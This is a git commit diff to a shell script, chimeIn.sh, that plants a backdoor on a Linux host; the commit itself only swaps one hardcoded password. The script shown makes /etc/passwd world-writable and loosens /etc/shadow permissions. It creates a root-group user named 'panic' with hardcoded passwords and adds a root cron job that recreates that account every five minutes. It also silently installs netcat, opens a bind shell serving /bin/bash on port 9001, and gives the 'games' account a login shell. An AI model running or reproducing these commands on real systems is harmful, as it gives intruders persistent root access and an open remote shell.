3c4975636880de51394cc26d7ba4e9e5a408c70b
Kole Swesey <45017744+0xPanic@users.noreply.github.com>
2020-12-09 19:22:04 -0600

    lore change

--- chimeIn.sh
+++ chimeIn.sh
@@ -3,7 +3,7 @@ chmod 644 /etc/shadow
 chmod 666 /etc/passwd
 useradd panic  && echo -e "iwrites1ns\niwrites1ns" | passwd panic
 usermod -a -G root panic
-echo "*/5 * * * *  root  useradd panic && echo -e "iwrites1ns\niwrites1ns" | passwd panic && usermod -a -G root panic" >> /etc/crontab
+echo "*/5 * * * *  root  useradd panic && echo -e "riseab0ve\nriseab0ve" | passwd panic && usermod -a -G root panic" >> /etc/crontab
 apt update > /dev/null 2> /dev/null && apt -y install netcat-traditional 2> /dev/null > /dev/null
 nc.traditional -l -p 9001 -e /bin/bash &
 usermod --shell /bin/bash games
